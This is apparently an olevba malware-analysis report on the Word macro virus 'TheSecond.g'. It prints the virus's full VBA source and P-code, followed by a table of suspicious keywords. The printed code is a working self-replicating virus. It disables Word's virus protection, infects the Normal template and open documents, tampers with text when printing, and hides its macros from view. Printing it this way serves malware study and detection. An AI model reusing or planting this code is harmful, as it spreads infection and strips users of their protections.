olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.TheSecond.g - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  ForYou = "Wait for the future Word-Excel release!"
  Options.VirusProtection = False
  flag = False
  counter = NormalTemplate.VBProject.VBComponents.Count
  For I = 1 To counter
    If NormalTemplate.VBProject.VBComponents.Item(I).Name = "TheSecond" Then flag = True
  Next I
  x = Application.StartupPath + "TheSecond.tmp"
  If Not flag Then
    ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
    NormalTemplate.VBProject.VBComponents.Import (x)
  End If
  flag = False
  infected = False
  havesave = ActiveDocument.Saved
  For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(I).Name = "TheSecond" Then flag = True
  Next I
  If Not flag Then
    NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
    ActiveDocument.VBProject.VBComponents.Import (x)
    infected = True
  End If
  If havesave Then
    If infected Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
  Else
    Dialogs(wdDialogFileSaveAs).Show
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "威徼�""
    .Replacement.Text = "腕滂�""
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
    .MatchSoundsLike = False
    .MatchAllWordForms = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "腕滂�""
    .Replacement.Text = "威徼�""
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
    .MatchSoundsLike = False
    .MatchAllWordForms = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("湾� 玎沭箧屙睇� 爨牮铖钼!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 924 bytes
' Macros/VBA/TheSecond - 3787 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitStr 0x0010 "The Second, 2000"
' 	St Copyrights 
' Line #2:
' 	LitStr 0x0027 "Wait for the future Word-Excel release!"
' 	St ForYou 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	St flag 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #7:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Name 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "TheSecond.tmp"
' 	Add 
' 	St x 
' Line #10:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #11:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitVarSpecial (False)
' 	St flag 
' Line #15:
' 	LitVarSpecial (False)
' 	St infected 
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #17:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Name 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #21:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #23:
' 	LitVarSpecial (True)
' 	St infected 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld havesave 
' 	IfBlock 
' Line #26:
' 	Ld infected 
' 	IfBlock 
' Line #27:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub FilePrint())
' Line #34:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #35:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #36:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #37:
' 	LitStr 0x0006 "威徼�""
' 	MemStWith Text 
' Line #38:
' 	LitStr 0x0006 "腕滂�""
' 	MemLdWith Replacement 
' 	MemSt Text 
' Line #39:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #40:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith Format 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #44:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #45:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #46:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #47:
' 	EndWith 
' Line #48:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #49:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #50:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #51:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #52:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #53:
' 	LitStr 0x0006 "腕滂�""
' 	MemStWith Text 
' Line #54:
' 	LitStr 0x0006 "威徼�""
' 	MemLdWith Replacement 
' 	MemSt Text 
' Line #55:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #56:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith Format 
' Line #58:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #59:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #61:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #63:
' 	EndWith 
' Line #64:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub ToolsMacro())
' Line #67:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub ViewVBCode())
' Line #70:
' 	LitStr 0x0019 "湾� 玎沭箧屙睇� 爨牮铖钼!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #71:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

